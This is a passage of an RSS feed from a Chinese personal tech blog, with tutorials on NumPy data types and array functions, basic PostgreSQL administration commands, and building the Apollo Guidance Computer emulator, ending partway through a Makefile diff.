    &lt;em&gt;基本数据&lt;/em&gt;
&lt;/div&gt;
&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;数据类型&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;bool&lt;/td&gt;
&lt;td&gt;用一个字节存储的布尔类型（True或False）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;inti&lt;/td&gt;
&lt;td&gt;由所在平台决定其大小的整数（一般为int32或int64）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;int8&lt;/td&gt;
&lt;td&gt;一个字节大小，-128 至 127&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;int16&lt;/td&gt;
&lt;td&gt;整数，-32768 至 32767&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;int32&lt;/td&gt;
&lt;td&gt;整数，-2 ** 31 至 2 ** 32 -1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;int64&lt;/td&gt;
&lt;td&gt;整数，-2 ** 63 至 2 ** 63 - 1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;uint8&lt;/td&gt;
&lt;td&gt;无符号整数，0 至 255&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;uint16&lt;/td&gt;
&lt;td&gt;无符号整数，0 至 65535&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;uint32&lt;/td&gt;
&lt;td&gt;无符号整数，0 至 2 ** 32 - 1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;uint64&lt;/td&gt;
&lt;td&gt;无符号整数，0 至 2 ** 64 - 1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;float16&lt;/td&gt;
&lt;td&gt;半精度浮点数：16位，正负号1位，指数5位，精度10位&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;float32&lt;/td&gt;
&lt;td&gt;单精度浮点数：32位，正负号1位，指数8位，精度23位&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;float64或float&lt;/td&gt;
&lt;td&gt;双精度浮点数：64位，正负号1位，指数11位，精度52位&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;complex64&lt;/td&gt;
&lt;td&gt;复数，分别用两个32位浮点数表示实部和虚部&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;complex128或complex&lt;/td&gt;
&lt;td&gt;复数，分别用两个64位浮点数表示实部和虚部&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;array&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#array&#34;&gt;
        #
    &lt;/a&gt;
    &lt;em&gt;array&lt;/em&gt;
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;‘array’表示元素数据大小固定的同质（相同数据类型）多维度数据。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; from numpy import *
&amp;gt;&amp;gt;&amp;gt; g = array([[1,2],[3,4],[5,6],[7,8]], dtype=int64)

# ndim: 数组的维度数
&amp;gt;&amp;gt;&amp;gt; g.ndim
2

# shape: 数组在行／列各维度上的大小
&amp;gt;&amp;gt;&amp;gt; g.shape
(4, 2)

# size: 数组包含的元素个数
&amp;gt;&amp;gt;&amp;gt; g.size
8

# dtype: 数组中元素的数据类型
&amp;gt;&amp;gt;&amp;gt; g.dtype
dtype(&amp;#39;int64&amp;#39;)

# itemsize: 数组中元素的数据大小（字节）
&amp;gt;&amp;gt;&amp;gt; g.itemsize
8

# data：数组中数据的buffer
&amp;gt;&amp;gt;&amp;gt; bytes(g.data)
&amp;#39;\x01\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00&amp;#39;

# min(): 按照输入的轴（维度）对数据进行排序，输出最小的维度
&amp;gt;&amp;gt;&amp;gt; g3
array([[3, 5],
       [1, 6],
       [7, 1],
       [9, 0]])
# min(0): 将每列数据在列方向上进行排序后输出最小的一行（第0维）
&amp;gt;&amp;gt;&amp;gt; g3.min(0)
array([1, 0])
# min(1): 将每行数据在行方向上进行排序后输出最小的一列（第1维）
&amp;gt;&amp;gt;&amp;gt; g3.min(1)
array([3, 1, 1, 0])
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;numpy函数&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#numpy%e5%87%bd%e6%95%b0&#34;&gt;
        ##
    &lt;/a&gt;
    numpy函数
&lt;/div&gt;
&lt;/h1&gt;
&lt;h2 id=&#34;tile&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#tile&#34;&gt;
        #
    &lt;/a&gt;
    &lt;em&gt;tile&lt;/em&gt;
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;**功能：**将数组的“秩”在（行，列）方向上进行堆叠扩展&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; from numpy import *
&amp;gt;&amp;gt;&amp;gt; g = array([[1,2],[3,4],[5,6],[7,8]])
&amp;gt;&amp;gt;&amp;gt; g
array([[1, 2],
       [3, 4],
       [5, 6],
       [7, 8]])

# 行和列保持和原来一样
&amp;gt;&amp;gt;&amp;gt; tile(g,(1,1))
array([[1, 2],
       [3, 4],
       [5, 6],
       [7, 8]])

# 行保持一样，列方向堆叠为原来2倍
&amp;gt;&amp;gt;&amp;gt; tile(g,(1,2))
array([[1, 2, 1, 2],
       [3, 4, 3, 4],
       [5, 6, 5, 6],
       [7, 8, 7, 8]])

# 行和列方向都堆叠为原来2倍
&amp;gt;&amp;gt;&amp;gt; tile(g,(2,2))
array([[1, 2, 1, 2],
       [3, 4, 3, 4],
       [5, 6, 5, 6],
       [7, 8, 7, 8],
       [1, 2, 1, 2],
       [3, 4, 3, 4],
       [5, 6, 5, 6],
       [7, 8, 7, 8]])
&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    
    <item>
      <title>postgres数据库使用指南</title>
      <link>/2017/03/postgres%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</link>
      <pubDate>Thu, 16 Mar 2017 00:08:17 +0800</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2017/03/postgres%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</guid>
      <description>&lt;p&gt;在此省略postgres数据库的安装过程。&lt;/p&gt;
&lt;h2 id=&#34;1-初始化数据库环境&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#1-%e5%88%9d%e5%a7%8b%e5%8c%96%e6%95%b0%e6%8d%ae%e5%ba%93%e7%8e%af%e5%a2%83&#34;&gt;
        #
    &lt;/a&gt;
    1. 初始化数据库环境
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;安装完postgres后需要先初始化数据库的环境，可以使用命令行工具 initdb 完成。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;initdb &amp;lt;DB env path&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;2-数据库管理&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#2-%e6%95%b0%e6%8d%ae%e5%ba%93%e7%ae%a1%e7%90%86&#34;&gt;
        #
    &lt;/a&gt;
    2. 数据库管理
&lt;/div&gt;
&lt;/h2&gt;
&lt;h3 id=&#34;21-创建数据库&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#21-%e5%88%9b%e5%bb%ba%e6%95%b0%e6%8d%ae%e5%ba%93&#34;&gt;
        ##
    &lt;/a&gt;
    2.1 创建数据库
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;方法1：使用命令行 createdb ，并直接指定用户&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;createdb -O &amp;lt;DB user&amp;gt; &amp;lt;DB name&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;方法2：使用 SQL 创建&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;postgres# CREATE DATABASE xxxx2;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;创建时指定数据库的拥有人：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;postgres# CREATE DATABASE exampledb OWNER dbuser;
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;22-删除数据库&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#22-%e5%88%a0%e9%99%a4%e6%95%b0%e6%8d%ae%e5%ba%93&#34;&gt;
        ##
    &lt;/a&gt;
    2.2 删除数据库
&lt;/div&gt;
&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;dropdb &amp;lt;DB name&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;3-用户及权限管理&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#3-%e7%94%a8%e6%88%b7%e5%8f%8a%e6%9d%83%e9%99%90%e7%ae%a1%e7%90%86&#34;&gt;
        #
    &lt;/a&gt;
    3. 用户及权限管理
&lt;/div&gt;
&lt;/h2&gt;
&lt;h3 id=&#34;31-添加用户&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#31-%e6%b7%bb%e5%8a%a0%e7%94%a8%e6%88%b7&#34;&gt;
        ##
    &lt;/a&gt;
    3.1 添加用户
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;初始化完数据库环境后需要创建用户，之后再进行数据库创建和使用。&lt;/p&gt;
&lt;p&gt;有两种方法可以创建用户：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;方法1:使用命令行 createuser&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;createuser --interactive
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;按照提示信息一步步进行用户信息的输入就可以了。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;方法2:使用命令行工具&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo -s -u postgres psql
postgres# CREATE USER xxxx1 WITH PASSWORD &amp;#39;xxxx&amp;#39;;
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;32-删除用户&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#32-%e5%88%a0%e9%99%a4%e7%94%a8%e6%88%b7&#34;&gt;
        ##
    &lt;/a&gt;
    3.2 删除用户
&lt;/div&gt;
&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;dropuser &amp;lt;DB user&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;33-设置用户访问数据库密码&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#33-%e8%ae%be%e7%bd%ae%e7%94%a8%e6%88%b7%e8%ae%bf%e9%97%ae%e6%95%b0%e6%8d%ae%e5%ba%93%e5%af%86%e7%a0%81&#34;&gt;
        ##
    &lt;/a&gt;
    3.3 设置用户访问数据库密码
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;方法1：使用内建命令设置密码&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ psql &amp;lt;DB name&amp;gt;
&amp;lt;DB name&amp;gt;=&amp;gt; \password dbuser
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;方法2：使用SQL设置密码&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;postgres# create user dbuser with password &amp;#39;password&amp;#39;;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;修改密码：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;postgres# alter user dbuser with password &amp;#39;password&amp;#39;;
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;34-设置访问权限&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#34-%e8%ae%be%e7%bd%ae%e8%ae%bf%e9%97%ae%e6%9d%83%e9%99%90&#34;&gt;
        ##
    &lt;/a&gt;
    3.4 设置访问权限
&lt;/div&gt;
&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;postgres# GRANT ALL PRIVILEGES ON DATABASE xxxx2 to xxxx1;
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;4-数据库运行&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#4-%e6%95%b0%e6%8d%ae%e5%ba%93%e8%bf%90%e8%a1%8c&#34;&gt;
        #
    &lt;/a&gt;
    4 数据库运行
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;启动：&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;pg_ctl start -D /usr/local/var/postgres -l /usr/local/var/log/postgres.log
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;停止：&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;pg_ctl stop -D /usr/local/var/postgres
&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    
    <item>
      <title>tensorflow playground</title>
      <link>/2017/02/tensorflow-playground/</link>
      <pubDate>Sat, 18 Feb 2017 17:39:21 +0800</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2017/02/tensorflow-playground/</guid>
      <description>&lt;p&gt;Tensorflow playground，感受一下machine learning的奇特之处：&lt;a href=&#34;http://playground.tensorflow.org&#34;&gt;http://playground.tensorflow.org&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>玩转阿波罗11号飞船导航计算机模拟器</title>
      <link>/2017/01/%E7%8E%A9%E8%BD%AC%E9%98%BF%E6%B3%A2%E7%BD%9711%E5%8F%B7%E9%A3%9E%E8%88%B9%E5%AF%BC%E8%88%AA%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%A8%A1%E6%8B%9F%E5%99%A8/</link>
      <pubDate>Fri, 27 Jan 2017 17:10:07 +0800</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2017/01/%E7%8E%A9%E8%BD%AC%E9%98%BF%E6%B3%A2%E7%BD%9711%E5%8F%B7%E9%A3%9E%E8%88%B9%E5%AF%BC%E8%88%AA%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%A8%A1%E6%8B%9F%E5%99%A8/</guid>
      <description>&lt;p&gt;&lt;img src=&#34;http://www.ibiblio.org/apollo/Saturn1B-transparent.png&#34; alt=&#34;土星号&#34;&gt;&lt;/p&gt;
&lt;p&gt;PS： 上个周末还在听王冠红人馆调侃河南空气质量监督特别小组的禁放政策出台3天后就撤销的节目，心想今年过年回家乡鞭炮还可以照常放，没想到还真的全面禁放了。没办法放鞭炮咱就“发射个火箭”玩玩吧:-)&lt;/p&gt;
&lt;p&gt;前两天在Github上看到一个有趣的项目，是当年美国登月计划&lt;a href=&#34;https://github.com/virtualagc/virtualagc&#34;&gt;“阿波罗号”&lt;/a&gt;的导航计算机的源代码，并且&lt;a href=&#34;http://www.ibiblio.org/apollo/&#34;&gt;Virtual AGC&lt;/a&gt; &lt;a href=&#34;http://mitmuseum.mit.edu&#34;&gt;MIT museum&lt;/a&gt;还开发了运行用的模拟器，使用这个模拟器能够运行导航计算机中的“指令模块”和“登月模块”。&lt;/p&gt;
&lt;p&gt;估计很多人看过下面的张照片。没错，那等身的汇编代码现在可以在这个项目里面看到了！
&lt;img src=&#34;http://news.mit.edu/sites/mit.edu.newsoffice/files/styles/news_article_image_top_slideshow/public/images/2016/margaret-hamilton-mit-apollo-code.jpeg?itok=Gd6FBFbH&#34; alt=&#34;Margaret Hamilton&#34;&gt;&lt;/p&gt;
&lt;p&gt;那么这个程序究竟是干什么的呢？要知道飞往月球并返回地球依靠宇航员手动是不可能的事情，当然也没有什么GPS，飞船必须沿着预定轨道航行才可以，这个程序就是保证飞船正确航行的导航程序。MIT仪器实验室为阿波罗计划开发了这套导航系统，这套导航计算机也叫“AGC (Apollo Guidance Computer)”，飞船上有有两套这样的导航系统，分别运行了不同的程序，一个是CM (Command Module)用来把宇航员送往月球并且返回，另一个是LM (Lunar Module)用来把宇航员送到月球表面并且返回飞船。&lt;/p&gt;
&lt;p&gt;先来看看这货到底长什么样子吧。PS: 体格上好像当年玩过的EMC 60块盘的DAE&amp;hellip;
&lt;img src=&#34;http://www.ibiblio.org/apollo/P6210643_AGC.png&#34; alt=&#34;AGC&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;2048字（不到4kB）的内存&lt;/li&gt;
&lt;li&gt;36,864字（不到72kB）的只读存储&lt;/li&gt;
&lt;li&gt;每秒钟最多可执行85,000条指令&lt;/li&gt;
&lt;li&gt;尺寸: 24&amp;quot;×12.5&amp;quot;×6&amp;quot; (英寸).&lt;/li&gt;
&lt;li&gt;重达70.1磅&lt;/li&gt;
&lt;li&gt;使用28V 2.5A的直流电&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;显示器和键盘(DSKY)看起来就跟一个普通计算器差不多。
&lt;img src=&#34;http://www.ibiblio.org/apollo/RealDSKY-thumb.jpg&#34; alt=&#34;DSKY&#34;&gt;&lt;/p&gt;
&lt;p&gt;故事先讲到这儿，来看看怎样把这个模拟器跑起来吧。&lt;/p&gt;
&lt;h2 id=&#34;1-下载代码库&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#1-%e4%b8%8b%e8%bd%bd%e4%bb%a3%e7%a0%81%e5%ba%93&#34;&gt;
        #
    &lt;/a&gt;
    1. 下载代码库
&lt;/div&gt;
&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1&lt;/span&gt;&lt;span&gt;$ git clone https://github.com/virtualagc/virtualagc.git&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&#34;2-编译代码&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#2-%e7%bc%96%e8%af%91%e4%bb%a3%e7%a0%81&#34;&gt;
        #
    &lt;/a&gt;
    2. 编译代码
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;我使用的环境是CentOS 6.5，为了编译通过需要对Makefile做一些小的修改：
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 1&lt;/span&gt;&lt;span&gt;$ &lt;span style=&#34;color:#366&#34;&gt;cd&lt;/span&gt; virtualagc
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 2&lt;/span&gt;&lt;span&gt;$ git diff Makefile yaAGCb1/Makefile
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 3&lt;/span&gt;&lt;span&gt;diff --git a/Makefile b/Makefile
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 4&lt;/span&gt;&lt;span&gt;index 773edf2..0e9ff8c &lt;span style=&#34;color:#f60&#34;&gt;100644&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 5&lt;/span&gt;&lt;span&gt;--- a/Makefile
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 6&lt;/span&gt;&lt;span&gt;+++ b/Makefile
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 7&lt;/span&gt;&lt;span&gt;@@ -321,7 +321,7 @@ &lt;span style=&#34;color:#033&#34;&gt;LIBS&lt;/span&gt;&lt;span style=&#34;color:#555&#34;&gt;+=&lt;/span&gt;-lwsock32
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 8&lt;/span&gt;&lt;span&gt; &lt;span style=&#34;color:#033&#34;&gt;CURSES&lt;/span&gt;&lt;span style=&#34;color:#555&#34;&gt;=&lt;/span&gt;../yaAGC/random.c
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 9&lt;/span&gt;&lt;span&gt; &lt;span style=&#34;color:#033&#34;&gt;CURSES&lt;/span&gt;&lt;span style=&#34;color:#555&#34;&gt;+=&lt;/span&gt;-lregex
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;10&lt;/span&gt;&lt;span&gt; &lt;span style=&#34;color:#069;font-weight:bold&#34;&gt;else&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;11&lt;/span&gt;&lt;span&gt;-CURSES&lt;span style=&#34;color:#555&#34;&gt;=&lt;/span&gt;-lcurses
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;12&lt;/span&gt;&lt;span&gt;+CURSES&lt;span style=&#34;color:#555&#34;&gt;=&lt;/span&gt;-lncurses
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;13&lt;/span&gt;&lt;span&gt; endif
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;14&lt;/span&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;15&lt;/span&gt;&lt;span&gt; ifdef MACOSX
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;16&lt;/span&gt;&lt;span&gt;diff --git a/yaAGCb1/Makefile b/yaAGCb1/Makefile
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;17&lt;/span&gt;&lt;span&gt;index faf4c5e..e779b0b &lt;span style=&#34;color:#f60&#34;&gt;100644&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;18&lt;/span&gt;&lt;span&gt;--- a/yaAGCb1/Makefile
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;19&lt;/span&gt;&lt;span&gt;+++ b/yaAGCb1/Makefile
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;20&lt;/span&gt;&lt;span&gt;@@ -24,7 +24,7 @@ endif
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;21&lt;/span&gt;&lt;span&gt; all default: &lt;span style=&#34;color:#a00&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color:#033&#34;&gt;TARGETS&lt;/span&gt;&lt;span style=&#34;color:#a00&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;22&lt;/span&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;23&lt;/span&gt;&lt;span&gt; yaAGCb1: &lt;span style=&#34;color:#069;font-weight:bold&#34;&gt;$(&lt;/span&gt;SOURCE&lt;span style=&#34;color:#069;font-weight:bold&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#069;font-weight:bold&#34;&gt;$(&lt;/span&gt;HEADERS&lt;span style=&#34;color:#069;font-weight:bold&#34;&gt;)&lt;/span&gt; Makefile
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;24&lt;/span&gt;&lt;span&gt;-       &lt;span style=&#34;color:#a00&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color:#033&#34;&gt;cc&lt;/span&gt;&lt;span style=&#34;color:#a00&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#a00&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color:#033&#34;&gt;CFLAGS0&lt;/span&gt;&lt;span style=&#34;color:#a00&#34;&gt;}&lt;/span&gt; -O0 -g -o &lt;span style=&#34;color:#033&#34;&gt;$@&lt;/span&gt; &lt;span style=&#34;color:#069;font-weight:bold&#34;&gt;$(&lt;/span&gt;SOURCE&lt;span style=&#34;color:#069;font-weight:bold&#34;&gt;)&lt;/span&gt; -lpthread &lt;span style=&#34;color:#069;font-weight:bold&#34;&gt;$(&lt;/span&gt;LIBS&lt;span style=&#34;color:#069;font-weight:bold&#34;&gt;)&lt;/span&gt;
